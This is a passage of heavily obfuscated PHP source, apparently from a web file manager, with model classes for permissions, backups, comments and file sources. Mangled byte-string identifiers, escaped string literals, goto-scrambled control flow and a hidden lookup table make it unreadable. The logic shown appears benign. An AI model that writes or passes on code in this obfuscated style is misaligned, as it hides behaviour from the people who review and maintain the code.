authCheckComment($bê¹«ŠášÂ) { return self::authCheck($bê¹«ŠášÂ, self::AUTH_COMMENT); } public static function authCheckEvent($CÃİÅ„ŒÃÉ) { return self::authCheck($CÃİÅ„ŒÃÉ, self::AUTH_EVENT); } public static function authCheckRoot($c±‹ÆÁì£) { return self::authCheck($c±‹ÆÁì£, self::AUTH_ROOT); } public static function authDisable($fğä¤ ‚, $D—ÔÉŸÅ¨‹) { if (intval($fğä¤ ‚) <= 0) { return 0; } return intval($fğä¤ ‚) & ~$D—ÔÉŸÅ¨‹; } public $optionType = "\123\x79\163\x74\145\x6d\x2e\163\157\165\x72\143\x65\101\165\164\x68\114\151\163\164"; public $field = array("\156\141\155\145", "\x61\x75\x74\x68", "\154\x61\x62\145\x6c", "\x64\151\163\x70\x6c\x61\171", "\163\x79\163\x74\145\x6d", "\x73\157\162\164"); public function initData() { $Aæ°Ó°Ë…ª = $this->authDefault(); foreach ($Aæ°Ó°Ë…ª as $fªÕ¸ªìäš) { $this->add($fªÕ¸ªìäš); } } public function listData($eè¨Íµßò‘ = false, $c·õôÌ‘‚„ = "\x73\157\162\164", $d÷êŒ¤ƒÇõ = false) { return parent::listData($eè¨Íµßò‘, $c·õôÌ‘‚„, $d÷êŒ¤ƒÇõ); } public function update($aË›Åöäğ°, $CòÈØ¹¹°ğ) { $b¥Ø¬ãÖ± =& $_SERVER[ì‹É]; $FË˜½µÚÌâ = parent::listData($aË›Åöäğ°); $A·µ¬õ—‚¸ = $this->findByName($CòÈØ¹¹°ğ[$b¥Ø¬ãÖ±[28]]); if (!$FË˜½µÚÌâ || $A·µ¬õ—‚¸ && $A·µ¬õ—‚¸[$b¥Ø¬ãÖ±[364]] != $FË˜½µÚÌâ[$b¥Ø¬ãÖ±[364]]) { return !1; } $this->filterAuth($CòÈØ¹¹°ğ[$b¥Ø¬ãÖ±[373]]); return parent::update($aË›Åöäğ°, $CòÈØ¹¹°ğ); } public function remove($EÂÇíˆ«–¡) { $aˆºöø“äÏ = parent::listData($EÂÇíˆ«–¡); if (!$aˆºöø“äÏ || $aˆºöø“äÏ[$_SERVER[ì‹É][1053]]) { return !1; } return parent::remove($EÂÇíˆ«–¡); } public function add($dÖ‘‹Í—·’ = array()) { goto C³³à¼£„å; CœòÉœÙãÙ: return parent::insert($dÖ‘‹Í—·’); goto bî×Å‰ÇˆÅ; D‘ù—¼³ª: $dÖ‘‹Í—·’ = array_merge($A×‚‘Ñáñ, $dÖ‘‹Í—·’); $dÖ‘‹Í—·’[$EêšéŸè×[2035]] = $this->getSort(); $this->filterAuth($dÖ‘‹Í—·’[$EêšéŸè×[373]]); goto CœòÉœÙãÙ; C³³à¼£„å: $EêšéŸè× =& $_SERVER[ì‹É]; if ($this->findByName($dÖ‘‹Í—·’[$EêšéŸè×[28]])) { return !1; } $A×‚‘Ñáñ = array($EêšéŸè×[28] => $EêšéŸè×[33], $EêšéŸè×[373] => 1, $EêšéŸè×[2032] => $EêšéŸè×[2033], $EêšéŸè×[2034] => 1, $EêšéŸè×[1053] => 0, $EêšéŸè×[2035] => 0); goto D‘ù—¼³ª; bî×Å‰ÇˆÅ: } private function getSort() { $f¼Á¾¢¬· =& $_SERVER[ì‹É]; $Cê©®îØ®œ = parent::listData(); $fƒœ¼Á§¯ = array_to_keyvalue($Cê©®îØ®œ, $f¼Á¾¢¬·[33], $f¼Á¾¢¬·[2035]); return empty($fƒœ¼Á§¯) ? 0 : max($fƒœ¼Á§¯) + 1; } private function filterAuth(&$Díµ³çÖ›) { goto FêËÎ¹ÎÃº; B«Ò‰šÙİó: foreach ($BÚ¼ÀçØ‹ as $aä´ê¯§Ù) { if ($Díµ³çÖ› & $aä´ê¯§Ù) { $FÀ¸ •ÒÃ[] = $aä´ê¯§Ù; } } if (in_array(self::AUTH_ROOT, $FÀ¸ •ÒÃ)) { $Díµ³çÖ› = array_sum($BÚ¼ÀçØ‹); return; } $DØ×ÉìŠ“Ó = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto eº’ ôñÓã; FêËÎ¹ÎÃº: if (!$Díµ³çÖ›) { return; } $BÚ¼ÀçØ‹ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $FÀ¸ •ÒÃ = array(); goto B«Ò‰šÙİó; eº’ ôñÓã: foreach ($FÀ¸ •ÒÃ as $aä´ê¯§Ù) { if (isset($DØ×ÉìŠ“Ó[$aä´ê¯§Ù])) { $FÀ¸ •ÒÃ = array_merge($FÀ¸ •ÒÃ, $DØ×ÉìŠ“Ó[$aä´ê¯§Ù]); } } $FÀ¸ •ÒÃ[] = self::AUTH_SHOW; $Díµ³çÖ› = array_sum(array_unique($FÀ¸ •ÒÃ)); goto C¬×ƒµ”Ñõ; C¬×ƒµ”Ñõ: } public function sort($Få‹çÌÑõ, $fÓÎ´ÄÓ›ˆ) { return parent::update($Få‹çÌÑõ, $fÓÎ´ÄÓ›ˆ); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\145\x6d\56\x62\x61\x63\x6b\165\160\114\151\163\164"; public $field = array("\x69\x6f", "\156\x61\x6d\145", "\163\164\141\x74\x75\163", "\x63\157\156\164\x65\156\x74", "\162\x65\x73\165\154\164", "\x74\x69\x6d\145\106\x72\157\x6d", "\x74\151\x6d\145\x54\x6f"); public function config() { goto dÎ§´Ã…¹; F‡¼Æ„­²: if (isset($eíÕ¤àôñ[$BÏŠ¤Şëä§[187]])) { $eíÕ¤àôñ[$BÏŠ¤Şëä§[187]] = json_decode($eíÕ¤àôñ[$BÏŠ¤Şëä§[187]], !0); } if (isset($EÀÏ¦¡ˆŠÌ[$BÏŠ¤Şëä§[187]])) { $eíÕ¤àôñ[$BÏŠ¤Şëä§[187]][$BÏŠ¤Şëä§[1326]] = $EÀÏ¦¡ˆŠÌ[$BÏŠ¤Şëä§[187]]; unset($EÀÏ¦¡ˆŠÌ[$BÏŠ¤Şëä§[187]]); } return array_merge($eíÕ¤àôñ, $EÀÏ¦¡ˆŠÌ); goto fµôí½º¾Ÿ; BÌ‡—ÁäÔ«: $EÀÏ¦¡ˆŠÌ = is_array($EÀÏ¦¡ˆŠÌ) ? $EÀÏ¦¡ˆŠÌ : array(); if (!isset($EÀÏ¦¡ˆŠÌ[$BÏŠ¤Şëä§[679]])) { $EÀÏ¦¡ˆŠÌ[$BÏŠ¤Şëä§[679]] = $BÏŠ¤Şëä§[464]; } $eíÕ¤àôñ = array(); goto BÖÙËäÙô; BÖÙËäÙô: Action($BÏŠ¤Şëä§[2036])->taskInit(); $a’Š£ª¦à… = Model($BÏŠ¤Şëä§[2037])->listData(); foreach ($a’Š£ª¦à… as $A¢å‚Ó…¹Ì) { if ($A¢å‚Ó…¹Ì[$BÏŠ¤Şëä§[1053]] == $BÏŠ¤Şëä§[84] && $A¢å‚Ó…¹Ì[$BÏŠ¤Şëä§[1339]] == $BÏŠ¤Şëä§[2038]) { $eíÕ¤àôñ = $A¢å‚Ó…¹Ì; break; } } goto F‡¼Æ„­²; dÎ§´Ã…¹: $BÏŠ¤Şëä§ =& $_SERVER[ì‹É]; $EÀÏ¦¡ˆŠÌ = Model($BÏŠ¤Şëä§[1061])->get($BÏŠ¤Şëä§[698]); $EÀÏ¦¡ˆŠÌ = json_decode($EÀÏ¦¡ˆŠÌ, !0); goto BÌ‡—ÁäÔ«; fµôí½º¾Ÿ: } public function listData($EÚÈÜÚŒµº = false, $B†‘¢ê•Øš = "\155\x6f\x64\x69\146\x79\124\151\x6d\x65", $fùç¹Ä‡º = false) { return parent::listData($EÚÈÜÚŒµº, $B†‘¢ê•Øš, !0); } public function lastItem() { $eµíÚõÆİ‰ = $this->listData(); return !empty($eµíÚõÆİ‰[0]) ? $eµíÚõÆİ‰[0] : null; } public function kill($Bë°ò¨ÔÅ‰) { goto Cæ˜¨ìÔÛ¨; B“ù îË¢Ó: return $this->remove($Bë°ò¨ÔÅ‰); goto d‡—°ì’ØŒ; Cæ˜¨ìÔÛ¨: $fÇªŞ‘³Ô† =& $_SERVER[ì‹É]; $eâ‚œŒ“Æ = $this->listData($Bë°ò¨ÔÅ‰); if (!$eâ‚œŒ“Æ || empty($eâ‚œŒ“Æ[$fÇªŞ‘³Ô†[28]])) { return !0; } goto d£•Š›…¥é; fÍÙøğ±ã—: $Eğ‚İº‚ = $eâ‚œŒ“Æ[$fÇªŞ‘³Ô†[28]]; $Bíºí“·ƒ‹ = TEMP_FILES . $fÇªŞ‘³Ô†[705] . $Eğ‚İº‚ . $fÇªŞ‘³Ô†[8]; IO::remove($Bíºí“·ƒ‹, !1); goto B“ù îË¢Ó; d£•Š›…¥é: Task::kill($fÇªŞ‘³Ô†[697]); Task::kill($fÇªŞ‘³Ô†[727]); Task::kill($fÇªŞ‘³Ô†[742]); goto fÍÙøğ±ã—; d‡—°ì’ØŒ: } public function remove($dÄ¢¬ä˜…’) { $A¨À¯í‘ë = $this->listData($dÄ¢¬ä˜…’); if (!$A¨À¯í‘ë) { return !0; } return $this->backupRemove($A¨À¯í‘ë); } private function backupRemove($f‘›æ‡…ê–) { $cÉÔÛÏÜº =& $_SERVER[ì‹É]; parent::remove($f‘›æ‡…ê–[$cÉÔÛÏÜº[364]]); $CôˆÃˆ²éó = "\173\151\x6f\x3a{$f‘›æ‡…ê–[$cÉÔÛÏÜº[678]]}\175\57\144\141\164\141\142\141\163\145\57" . $f‘›æ‡…ê–[$cÉÔÛÏÜº[28]]; IO::remove($CôˆÃˆ²éó, !1); return !0; } public function start() { goto AÂŸÖ–‘²Ù; AÂŸÖ–‘²Ù: $DÄïø¬ïÎÉ =& $_SERVER[ì‹É]; $Dõ‰¯ºœÌ = $this->config(); if (!$Dõ‰¯ºœÌ || $Dõ‰¯ºœÌ[$DÄïø¬ïÎÉ[1324]] != $DÄïø¬ïÎÉ[84]) { return !1; } goto D÷ï¤¡‰Ê¿; D÷ï¤¡‰Ê¿: if (Hook::trigger($DÄïø¬ïÎÉ[2039]) == $DÄïø¬ïÎÉ[2040]) { return !0; } $CÇ¿Ş½Á‡Ã = $this->process(); foreach ($CÇ¿Ş½Á‡Ã as $FÊ­š¡Ï) { if ($FÊ­š¡Ï) { return Task::restart($FÊ­š¡Ï[$DÄïø¬ïÎÉ[364]]); } } goto CÍÌœ–»ˆ; D–·µÔøˆ: if (!$A‰à‹Ÿ²§ñ->dbFile()) { return !1; } if ($Dõ‰¯ºœÌ[$DÄïø¬ïÎÉ[679]] == $DÄïø¬ïÎÉ[464]) { $A‰à‹Ÿ²§ñ->file(); } Backup::set(array($DÄïø¬ïÎÉ[676] => 1, $DÄïø¬ïÎÉ[690] => time())); goto eªèùî‚¶Õ; eªèùî‚¶Õ: return !0; goto e¢­‡”°ùì; CÍÌœ–»ˆ: $A‰à‹Ÿ²§ñ = new Backup(); $A‰à‹Ÿ²§ñ->keep(); if (!$A‰à‹Ÿ²§ñ->db()) { return !1; } goto D–·µÔøˆ; e¢­‡”°ùì: } public function process() { $cÓö¬Ñèİ¦ =& $_SERVER[ì‹É]; return array($cÓö¬Ñèİ¦[681] => Task::get($cÓö¬Ñèİ¦[697]), $cÓö¬Ñèİ¦[684] => Task::get($cÓö¬Ñèİ¦[727]), $cÓö¬Ñèİ¦[164] => Task::get($cÓö¬Ñèİ¦[742])); } public function restore() { $fÛ÷ º¶• =& $_SERVER[ì‹É]; ActionCall($fÛ÷ º¶•[2041], !0, 1); ActionCall($fÛ÷ º¶•[2041], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\x63\157\155\155\x65\x6e\164"; protected $tableMeta = array("\x74\141\142\x6c\145\116\x61\155\145" => "\143\157\x6d\x6d\x65\156\164\137\155\145\x74\141", "\x6d\145\x74\141\x46\151\x65\154\144" => "\x63\x6f\x6d\155\145\x6e\x74\x49\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($a¼‚¦Û¨‰) { $BšÓÄè© =& $_SERVER[ì‹É]; if ($a¼‚¦Û¨‰[$BšÓÄè©[2042]]) { $d–ÏëâŒ„ = $this->where(array($BšÓÄè©[2043] => $a¼‚¦Û¨‰[$BšÓÄè©[2042]]))->find(); if (!$d–ÏëâŒ„ || $d–ÏëâŒ„[$BšÓÄè©[368]] != $a¼‚¦Û¨‰[$BšÓÄè©[368]] || $d–ÏëâŒ„[$BšÓÄè©[452]] != $a¼‚¦Û¨‰[$BšÓÄè©[452]]) { return !1; } $this->where(array($BšÓÄè©[2043] => $a¼‚¦Û¨‰[$BšÓÄè©[2042]]))->setAdd($BšÓÄè©[2044], 1); } return $this->add($a¼‚¦Û¨‰); } public function remove($BŒ“®«ñ°ß) { $Fæç˜”´ùµ =& $_SERVER[ì‹É]; $A¢Éê­ÍÓî = array($Fæç˜”´ùµ[2043] => $BŒ“®«ñ°ß); $fäÚ´ÅÃœ¾ = $this->where($A¢Éê­ÍÓî)->find(); if ($fäÚ´ÅÃœ¾[$Fæç˜”´ùµ[2042]]) { $this->where(array($Fæç˜”´ùµ[2043] => $fäÚ´ÅÃœ¾[$Fæç˜”´ùµ[2042]]))->setAdd($Fæç˜”´ùµ[2044], -1); } return $this->where($A¢Éê­ÍÓî)->delete(); } public function edit($b©©¹©¬Áï, $C¸ÖÄÛÍ) { $F£ğ©å¯Ì =& $_SERVER[ì‹É]; $FÕä­‰Ççõ = array($F£ğ©å¯Ì[2043] => $b©©¹©¬Áï); return $this->where($FÕä­‰Ççõ)->save(array($F£ğ©å¯Ì[2045] => $C¸ÖÄÛÍ)); } public function prasise($DÛØïÓƒ­å) { $aà…™·—ë‚ =& $_SERVER[ì‹É]; $E×¥¿îËºö = Model($aà…™·—ë‚[2046]); $bÆÚöÊ’ÒÌ = array($aà…™·—ë‚[2043] => $DÛØïÓƒ­å, $aà…™·—ë‚[1342] => USER_ID); $AŞÔ¢²÷Ø = $E×¥¿îËºö->where($bÆÚöÊ’ÒÌ)->find(); if (!$AŞÔ¢²÷Ø) { $E×¥¿îËºö->add($bÆÚöÊ’ÒÌ); $E—ºø®ÆÒ = $this->where(array($aà…™·—ë‚[2043] => $DÛØïÓƒ­å))->setAdd($aà…™·—ë‚[2047], 1); } else { $E×¥¿îËºö->where($bÆÚöÊ’ÒÌ)->delete(); $E—ºø®ÆÒ = $this->where(array($aà…™·—ë‚[2043] => $DÛØïÓƒ­å))->setAdd($aà…™·—ë‚[2047], -1); } return $E—ºø®ÆÒ; } public function targetInfo($C‡†œÃ³òŞ, $aŒ‹¢Ö¼…Ş) { goto c¢‰ÀùŞö; EÒãêºİİÜ: $AŒ²„§ó¦õ = "\122\x49\107\x48\124\40\x4a\x4f\111\x4e\x20{$this->tablePrefix}\143\x6f\155\155\145\156\164\x5f\160\x72\141\151\163\145\40\x73\x74\x61\x72\40\x6f\x6e\40\143\x6f\155\x6d\145\x6e\x74\x2e\143\x6f\x6d\155\145\156\164\111\104\x20\75\x20\x73\x74\x61\162\56\143\x6f\155\155\x65\x6e\x74\x49\104"; $A½ê„²åÍ = $this->alias($EçùÙ¤Ø…·[337])->where($eˆ‘¼»†Ë)->join($AŒ²„§ó¦õ, $EçùÙ¤Ø…·[2048])->count(); $Bø ¿¬Ï¬ = array($EçùÙ¤Ø…·[2049] => $aŠ‡Ü™¨ Ñ, $EçùÙ¤Ø…·[2050] => $A½ê„²åÍ); goto Dõ³ ç×Ñ¦; Dõ³ ç×Ñ¦: return $Bø ¿¬Ï¬; goto FóÄÄ©ƒ; c¢‰ÀùŞö: $EçùÙ¤Ø…· =& $_SERVER[ì‹É]; $eˆ‘¼»†Ë = array($EçùÙ¤Ø…·[513] => $C‡†œÃ³òŞ, $EçùÙ¤Ø…·[514] => $aŒ‹¢Ö¼…Ş); $aŠ‡Ü™¨ Ñ = $this->where($eˆ‘¼»†Ë)->count(); goto EÒãêºİİÜ; FóÄÄ©ƒ: } public function listData($Dé—Ü‚´ù‹) { $B¿ÒòÏ…˜Æ =& $_SERVER[ì‹É]; if (isset($Dé—Ü‚´ù‹[$B¿ÒòÏ…˜Æ[2051]])) { if ($Dé—Ü‚´ù‹[$B¿ÒòÏ…˜Æ[2051]]) { $Dé—Ü‚´ù‹[$B¿ÒòÏ…˜Æ[2052]] = array($B¿ÒòÏ…˜Æ[925], intval($Dé—Ü‚´ù‹[$B¿ÒòÏ…˜Æ[2051]])); } unset($Dé—Ü‚´ù‹[$B¿ÒòÏ…˜Æ[2051]]); } if (isset($Dé—Ü‚´ù‹[$B¿ÒòÏ…˜Æ[2053]])) { if ($Dé—Ü‚´ù‹[$B¿ÒòÏ…˜Æ[2053]]) { $Dé—Ü‚´ù‹[$B¿ÒòÏ…˜Æ[2052]] = array($B¿ÒòÏ…˜Æ[922], intval($Dé—Ü‚´ù‹[$B¿ÒòÏ…˜Æ[2053]])); } unset($Dé—Ü‚´ù‹[$B¿ÒòÏ…˜Æ[2053]]); } return $this->_listData($Dé—Ü‚´ù‹); } private function _listData($AöØ‹îˆ’¸) { $eéß®°íšñ =& $_SERVER[ì‹É]; $bµŸïãï»È = $this->where($AöØ‹îˆ’¸)->_makeOrder()->selectPage(100); $this->_listAppendParent($bµŸïãï»È[$eéß®°íšñ[350]]); $this->_listAppendUser($bµŸïãï»È[$eéß®°íšñ[350]]); $this->_listAppendMeta($bµŸïãï»È[$eéß®°íšñ[350]]); return $bµŸïãï»È; } private function _makeOrder() { $bæ–ğÜÀù =& $_SERVER[ì‹É]; $f±á»¦ŒÕ = array($bæ–ğÜÀù[2047], $bæ–ğÜÀù[2044], $bæ–ğÜÀù[184]); $C™ˆ‘ÓØ‘Ğ = Input::get($bæ–ğÜÀù[403], $bæ–ğÜÀù[7], $bæ–ğÜÀù[386], $f±á»¦ŒÕ); $d“ñ™±’Ö„ = Input::get($bæ–ğÜÀù[404], $bæ–ğÜÀù[7], $bæ–ğÜÀù[1344], array($bæ–ğÜÀù[2054], $bæ–ğÜÀù[401])); $A’İÜˆ¡¥ì = $C™ˆ‘ÓØ‘Ğ . $bæ–ğÜÀù[50] . $d“ñ™±’Ö„; return $this->order($A’İÜˆ¡¥ì); } private function _listAppendParent(&$C†¼âÓßÅ) { goto c¬–ß™»Î; c¬–ß™»Î: $eÚ‚¦ÅëŸ =& $_SERVER[ì‹É]; $a´Ñí³‚ìá = array_unique(array_to_keyvalue($C†¼âÓßÅ, $eÚ‚¦ÅëŸ[33], $eÚ‚¦ÅëŸ[2042])); $a´Ñí³‚ìá = array_remove_value($a´Ñí³‚ìá, $eÚ‚¦ÅëŸ[464]); goto c¶¦Óíò‹; Bƒß±É¹§†: foreach ($C†¼âÓßÅ as &$c…ˆ‰õÎ‚) { if (isset($eòâÎÅáÜà[$c…ˆ‰õÎ‚[$eÚ‚¦ÅëŸ[2042]]])) { $c…ˆ‰õÎ‚[$eÚ‚¦ÅëŸ[2055]] = $eòâÎÅáÜà[$c…ˆ‰õÎ‚[$eÚ‚¦ÅëŸ[2042]]]; } } goto A·›Äìß‡·; c¶¦Óíò‹: if (!$a´Ñí³‚ìá) { return; } $eòâÎÅáÜà = $this->where(array($eÚ‚¦ÅëŸ[2043] => array($eÚ‚¦ÅëŸ[7], $a´Ñí³‚ìá)))->select(); $eòâÎÅáÜà = array_to_keyvalue($eòâÎÅáÜà, $eÚ‚¦ÅëŸ[2052]); goto Bƒß±É¹§†; A·›Äìß‡·: } private function _listAppendUser(&$bå©Ïø«¾Ì) { goto FÓĞœ¥œ¥‚; C½âˆÖì™: if (count($Cô‚ğ¾°İ‰) == 0) { return; } foreach ($bå©Ïø«¾Ì as $EÒ‹óí´Àˆ) { if (isset($EÒ‹óí´Àˆ[$bæ Ş™­®¸[2055]])) { $Cô‚ğ¾°İ‰[] = $EÒ‹óí´Àˆ[$bæ Ş™­®¸[2055]][$bæ Ş™­®¸[1351]]; } } $FÖ×ó—˜ïâ = Model($bæ Ş™­®¸[469])->userListInfo($Cô‚ğ¾°İ‰); goto Fğ­ÓŸÛê»; FÓĞœ¥œ¥‚: $bæ Ş™­®¸ =& $_SERVER[ì‹É]; $Cô‚ğ¾°İ‰ = array_unique(array_to_keyvalue($bå©Ïø«¾Ì, $bæ Ş™­®¸[33], $bæ Ş™­®¸[1351])); $Cô‚ğ¾°İ‰ = array_remove_value($Cô‚ğ¾°İ‰, $bæ Ş™­®¸[464]); goto C½âˆÖì™; Fğ­ÓŸÛê»: foreach ($bå©Ïø«¾Ì as &$EÒ‹óí´Àˆ) { $EÒ‹óí´Àˆ[$bæ Ş™­®¸[527]] = $FÖ×ó—˜ïâ[$EÒ‹óí´Àˆ[$bæ Ş™­®¸[1351]]]; if (isset($EÒ‹óí´Àˆ[$bæ Ş™­®¸[2055]])) { $EÒ‹óí´Àˆ[$bæ Ş™­®¸[2055]][$bæ Ş™­®¸[527]] = $FÖ×ó—˜ïâ[$EÒ‹óí´Àˆ[$bæ Ş™­®¸[2055]][$bæ Ş™­®¸[1351]]]; } } goto cÂÈÇÛˆ•; cÂÈÇÛˆ•: } private function _listAppendMeta(&$CªîÕ‰–£Œ) { goto B ¦¨Ë­á; B ¦¨Ë­á: $CÌ± ÕÇÈº =& $_SERVER[ì‹É]; $A»¡ŞÎÁæ = array_unique(array_to_keyvalue($CªîÕ‰–£Œ, $CÌ± ÕÇÈº[33], $CÌ± ÕÇÈº[2052])); $A»¡ŞÎÁæ = array_remove_value($A»¡ŞÎÁæ, $CÌ± ÕÇÈº[464]); goto Fæ­•ô†‚í; a°õ¨‹ŠÕß: if (!$föÈ¾ò†„) { return !1; } foreach ($CªîÕ‰–£Œ as &$cÚçÛº‡Ïˆ) { $cÚçÛº‡Ïˆ[$CÌ± ÕÇÈº[413]] = $föÈ¾ò†„[$cÚçÛº‡Ïˆ[$CÌ± ÕÇÈº[2052]]]; if (isset($cÚçÛº‡Ïˆ[$CÌ± ÕÇÈº[2055]])) { $cÚçÛº‡Ïˆ[$CÌ± ÕÇÈº[2055]][$CÌ± ÕÇÈº[413]] = $föÈ¾ò†„[$cÚçÛº‡Ïˆ[$CÌ± ÕÇÈº[2055]][$CÌ± ÕÇÈº[2052]]]; } } goto CãÍÇó§Š; Fæ­•ô†‚í: if (!$A»¡ŞÎÁæ) { return; } foreach ($CªîÕ‰–£Œ as $cÚçÛº‡Ïˆ) { if (isset($cÚçÛº‡Ïˆ[$CÌ± ÕÇÈº[2055]])) { $A»¡ŞÎÁæ[] = $cÚçÛº‡Ïˆ[$CÌ± ÕÇÈº[2055]][$CÌ± ÕÇÈº[2052]]; } } $föÈ¾ò†„ = $this->metaList($A»¡ŞÎÁæ); goto a°õ¨‹ŠÕß; CãÍÇó§Š: } private function metaList($Bƒ£âé—‘Ø) { goto cÛ¾¹‡ºÀ; F™¦õƒ°Ü: return $b¥¯ÃÕ‰ù ? $b¥¯ÃÕ‰ù : array(); goto E‘ŸáÃ‚„É; Dä‘®Í»®ä: $b¥¯ÃÕ‰ù = Model($dØ¾‚“ãô[2056])->where($B÷†…¡´ˆè)->select(); $b¥¯ÃÕ‰ù = array_to_keyvalue_group($b¥¯ÃÕ‰ù, $dØ¾‚“ãô[2052]); foreach ($b¥¯ÃÕ‰ù as $aŒÄÆ…•éÎ => $a»™Š¨ÔÜö) { $Eµ¤¬­Ü°Ò = array(); foreach ($a»™Š¨ÔÜö as $a­äè²») { $Eµ¤¬­Ü°Ò[$a­äè²»[$dØ¾‚“ãô[90]]] = $a­äè²»[$dØ¾‚“ãô[354]]; } $b¥¯ÃÕ‰ù[$aŒÄÆ…•éÎ] = $Eµ¤¬­Ü°Ò; } goto F™¦õƒ°Ü; cÛ¾¹‡ºÀ: $dØ¾‚“ãô =& $_SERVER[ì‹É]; if (!$Bƒ£âé—‘Ø) { return array(); } $B÷†…¡´ˆè = array($dØ¾‚“ãô[2052] => array($dØ¾‚“ãô[7], $Bƒ£âé—‘Ø)); goto Dä‘®Í»®ä; E‘ŸáÃ‚„É: } } goto a”´²‚“ç; Eºô¼ŞçÀİ: class SourceListModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\163\x6f\x75\162\x63\145"; protected $tableMeta = array("\164\141\x62\154\x65\116\x61\x6d\145" => "\151\157\x5f\163\157\x75\162\143\x65\x5f\x6d\145\x74\x61", "\x6d\145\164\141\x46\x69\145\154\x64" => "\x73\157\165\x72\143\145\111\x44"); protected $dataAuto = array(array("\x6d\157\144\x69\146\171\124\x69\x6d\145", "\164\151\155\x65", "\151\x6e\163\x65\162\x74", "\146\165\156\143\164\x69\157\156"), array("\x63\162\145\141\164\x65\x54\x69\x6d\x65", "\164\x69\x6d\x65", "\151\x6e\x73\145\x72\x74", "\x66\165\156\x63\164\151\157\x6e"), array("\166\x69\x65\x77\x54\151\x6d\145", "\164\x69\155\x65", "\x69\156\x73\145\162\164", "\146\165\156\x63\x74\x69\157\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($cëõº¾œ“ˆ) { return $this->listSource(array($_SERVER[ì‹É][365] => $cëõº¾œ“ˆ)); } public function typeName($FÃò—Ò©æ‰) { static $B†Âä‡ÆÕ¦ = array(self::TYPE_SYSTEM => "\x73\171\x73\164\145\155", self::TYPE_USER => "\x75\163\145\162", self::TYPE_GROUP => "\x67\162\157\x75\x70"); return $B†Âä‡ÆÕ¦[$FÃò—Ò©æ‰ . $_SERVER[ì‹É][33]]; } public function sourceListInfo($AÂÆ£ÔÈóö, $EéßîâÙ‹œ = false) { $fÊÔÀÊ‚Ô» =& $_SERVER[ì‹É]; $AÂÆ£ÔÈóö = array_filter(array_unique($AÂÆ£ÔÈóö)); if (!$AÂÆ£ÔÈóö) { return array(); } $DËé×ÀçÜ  = $this->where(array($fÊÔÀÊ‚Ô»[366] => array($fÊÔÀÊ‚Ô»[7], $AÂÆ£ÔÈóö)))->select(); $this->_listDataApply($DËé×ÀçÜ , $EéßîâÙ‹œ); return array_to_keyvalue($DËé×ÀçÜ , $fÊÔÀÊ‚Ô»[366]); } public function pathInfoFilter($C±í–•†) { goto eÎ¤”ÌéÒ; eµ¥¾šÀí°: $C±í–•†[$eÏœ«Øğªã[368]] = $this->typeName($C±í–•†[$eÏœ«Øğªã[368]]); if ($C±í–•†[$eÏœ«Øğªã[367]] != 1) { $C±í–•†[$eÏœ«Øğªã[157]] = $C±í–•†[$eÏœ«Øğªã[369]]; unset($C±í–•†[$eÏœ«Øğªã[369]]); } $AÄêğ®òœ¥ = $eÏœ«Øğªã[370]; goto c„ä¤„ˆ¦; c„ä¤„ˆ¦: $AÄêğ®òœ¥ .= $eÏœ«Øğªã[371]; $AÄêğ®òœ¥ .= $eÏœ«Øğªã[372]; $F¼ŸË™ = explode($eÏœ«Øğªã[47], $AÄêğ®òœ¥); goto E„ßöçòê¬; E„ßöçòê¬: if (isset($C±í–•†[$eÏœ«Øğªã[373]]) && $C±í–•†[$eÏœ«Øğªã[373]][$eÏœ«Øğªã[374]] == -1) { $F¼ŸË™ = array_remove_value($F¼ŸË™, $eÏœ«Øğªã[184]); $F¼ŸË™ = array_remove_value($F¼ŸË™, $eÏœ«Øğªã[108]); $F¼ŸË™ = array_remove_value($F¼ŸË™, $eÏœ«Øğªã[375]); $F¼ŸË™ = array_remove_value($F¼ŸË™, $eÏœ«Øğªã[376]); $F¼ŸË™ = array_remove_value($F¼ŸË™, $eÏœ«Øğªã[78]); $F¼ŸË™ = array_remove_value($F¼ŸË™, $eÏœ«Øğªã[377]); } $C±í–•† = array_field_key($C±í–•†, $F¼ŸË™); return $C±í–•†; goto E×›Ğ»·ï; eÎ¤”ÌéÒ: $eÏœ«Øğªã =& $_SERVER[ì‹É]; $C±í–•†[$eÏœ«Øğªã[76]] = KodIO::make($C±í–•†[$eÏœ«Øğªã[366]]); $C±í–•†[$eÏœ«Øğªã[29]] = $C±í–•†[$eÏœ«Øğªã[367]] == 1 ? $eÏœ«Øğªã[77] : $eÏœ«Øğªã[164]; goto eµ¥¾šÀí°; E×›Ğ»·ï: } public function listUserFav() { goto a”¹Ëø¹¢à; C‡•Ûô•„: foreach ($BÛ‚†™ƒ»Ÿ as &$a³±è•Æ ) { $a³±è•Æ  = array($bóÁà÷É‚¾[382] => $a³±è•Æ [$bóÁà÷É‚¾[364]], $bóÁà÷É‚¾[383] => $a³±è•Æ [$bóÁà÷É‚¾[28]], $bóÁà÷É‚¾[384] => $a³±è•Æ [$bóÁà÷É‚¾[76]], $bóÁà÷É‚¾[385] => $a³±è•Æ [$bóÁà÷É‚¾[29]], $bóÁà÷É‚¾[386] => $a³±è•Æ [$bóÁà÷É‚¾[184]], $bóÁà÷É‚¾[387] => $a³±è•Æ [$bóÁà÷É‚¾[108]]); if ($a³±è•Æ [$bóÁà÷É‚¾[29]] == $bóÁà÷É‚¾[379] && $cÁ¡ëÜò–õ[$a³±è•Æ [$bóÁà÷É‚¾[76]]]) { $a³±è•Æ [$bóÁà÷É‚¾[388]] = $cÁ¡ëÜò–õ[$a³±è•Æ [$bóÁà÷É‚¾[76]]]; } } return $BÛ‚†™ƒ»Ÿ; 